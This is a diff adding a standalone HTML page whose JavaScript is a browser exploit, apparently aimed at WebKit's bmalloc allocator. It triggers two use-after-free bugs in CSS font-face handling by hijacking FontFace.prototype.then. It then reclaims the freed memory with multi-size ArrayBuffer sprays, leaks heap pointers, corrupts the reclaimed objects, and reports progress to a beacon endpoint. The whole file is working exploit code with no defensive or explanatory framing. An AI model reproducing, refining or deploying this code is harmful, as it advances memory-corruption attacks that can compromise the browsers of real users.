@@ -1,0 +1,192 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1104v4</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:12px/1.5 monospace;padding:12px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+B('P1104v4-BOOT','');
+log('phase','P1104v4: DUAL UAF — pre-conditioned multi-size spray');
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+// ============================================================
+// UAF #1: Exact proven pattern
+// ============================================================
+var st1=document.createElement('style');
+st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st1);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var fired1=false,map1=null,buf1=null,ptrs1=null,idx1=-1,patched1=false;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired1)return undefined;fired1=true;
+  if(st1){st1.remove();st1=null;}
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map1=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em s0');}catch(e){}
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Poll UAF1
+for(var t=15;t<=200;t+=5){(function(ms){setTimeout(function(){
+  if(patched1||!map1)return;
+  for(var bi=32;bi<40;bi++){
+    if(!map1[bi])continue;
+    var b=new BigUint64Array(map1[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!patched1){
+      patched1=true;buf1=b;idx1=bi;ptrs1=[];
+      for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs1.push({off:q*8,val:b[q]});
+      b[0]=0x100n;
+      B('P1104v4-UAF1','buf='+bi+'|ms='+ms+'|'+ptrs1.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+    }
+  }
+},ms);})(t);}
+
+// ============================================================
+// UAF #2: Pre-condition bmalloc, then full multi-size spray
+// The key insight: after UAF1 consumes the 192B free list,
+// we need to "prime" bmalloc with alloc/free cycles so the
+// second CSSFontFace free lands where our spray can reach.
+// ============================================================
+setTimeout(function(){
+  if(!patched1){B('P1104v4-NOHIT1','');return;}
+  B('P1104v4-S1','uaf1 ok');
+
+  // Pre-conditioning: alloc 64 x 192B buffers, then release them
+  // This creates 64 free slots in the 192-byte page(s)
+  // When the second CSSFontFace is freed, it should go to one of these pages
+  // Then our spray's 192B allocations will fill from the same pages
+  var precond=[];
+  for(var i=0;i<64;i++)precond.push(new ArrayBuffer(192));
+  precond=null; // Release to GC — but GC is lazy, so also try explicit
+  // Force some GC pressure
+  var gcPressure=[];
+  for(var i=0;i<2000;i++)gcPressure.push(new ArrayBuffer(1024));
+  gcPressure=null;
+
+  B('P1104v4-S2','precond done');
+
+  // Create second CSS font
+  var st2=document.createElement('style');
+  st2.textContent="@font-face{font-family:s2;src:local(Courier);unicode-range:U+0043;}";
+  document.head.appendChild(st2);
+  var f2=new FontFace('f2','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(f2);void f2.loaded;
+
+  var fired2=false,map2=null,buf2=null,ptrs2=null,idx2=-1,patched2=false;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired2)return undefined;fired2=true;
+    B('P1104v4-G2','enter');
+
+    // Free the CSS font
+    if(st2){st2.remove();st2=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    // Full multi-size spray — SAME pattern as UAF1 that works 100%
+    map2=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){map2.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+    }
+    try{document.fonts.check('1em s2');}catch(e){}
+
+    // Inline scan of 192B buffers (indices 32-39)
+    for(var bi=32;bi<40;bi++){
+      if(!map2[bi])continue;
+      var b=new BigUint64Array(map2[bi].ab);
+      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+      if(nz>0){
+        patched2=true;buf2=b;idx2=bi;ptrs2=[];
+        for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
+        b[0]=0x100n;
+        B('P1104v4-G2-HIT','buf='+bi+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+        break;
+      }
+    }
+
+    // If not found in 192B, scan wider (128-256B range)
+    if(!patched2){
+      for(var bi=0;bi<map2.length;bi++){
+        var sz=map2[bi].size;
+        if(sz<128||sz>256||sz===192)continue;
+        var b=new BigUint64Array(map2[bi].ab);
+        var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+        if(nz>0){
+          patched2=true;buf2=b;idx2=bi;ptrs2=[];
+          for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
+          b[0]=0x100n;
+          B('P1104v4-G2-ALT','buf='+bi+'|sz='+sz+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+          break;
+        }
+      }
+    }
+
+    B('P1104v4-G2-DONE','found='+patched2);
+    return undefined;
+  },set:function(){}});
+
+  B('P1104v4-S3','triggering');
+  document.fonts.load('1em f2, s2','CD').then(function(){
+    B('P1104v4-LOAD2','resolved');
+  },function(){
+    B('P1104v4-LOAD2','rejected');
+  });
+
+  // Poll + final analysis
+  for(var t2=15;t2<=400;t2+=10){(function(ms){setTimeout(function(){
+    if(patched2||!map2)return;
+    for(var bi=32;bi<40;bi++){
+      if(!map2[bi])continue;
+      var b=new BigUint64Array(map2[bi].ab);
+      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+      if(nz>0&&!patched2){
+        patched2=true;buf2=b;idx2=bi;ptrs2=[];
+        for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
+        b[0]=0x100n;
+        B('P1104v4-UAF2','buf='+bi+'|ms='+ms+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+      }
+    }
+  },ms);})(t2);}
+
+  setTimeout(function(){
+    if(!patched2){
+      B('P1104v4-DONE','uaf1=ok|uaf2=fail');
+      return;
+    }
+    var ptr1_58=0n,ptr1_68=0n,ptr2_58=0n,ptr2_68=0n;
+    for(var i=0;i<ptrs1.length;i++){
+      if(ptrs1[i].off===0x58)ptr1_58=ptrs1[i].val;
+      if(ptrs1[i].off===0x68)ptr1_68=ptrs1[i].val;
+    }
+    for(var i=0;i<ptrs2.length;i++){
+      if(ptrs2[i].off===0x58)ptr2_58=ptrs2[i].val;
+      if(ptrs2[i].off===0x68)ptr2_68=ptrs2[i].val;
+    }
+    var m1=0xAAAA1111n,m2=0xBBBB2222n;
+    buf1[1]=m1;buf2[1]=m2;
+    var ov=buf1[1]===m2||buf2[1]===m1;
+    buf1[1]=0n;buf2[1]=0n;
+    var s='i1='+idx1+'|i2='+idx2+'|ov='+ov;
+    s+='|p1_58='+hex(ptr1_58)+'|p1_68='+hex(ptr1_68);
+    s+='|p2_58='+hex(ptr2_58)+'|p2_68='+hex(ptr2_68);
+    B('P1104v4-DUAL',s);
+    B('P1104v4-DONE','dual=true|overlap='+ov);
+  },2500);
+},600);
+</script>
+</body></html>
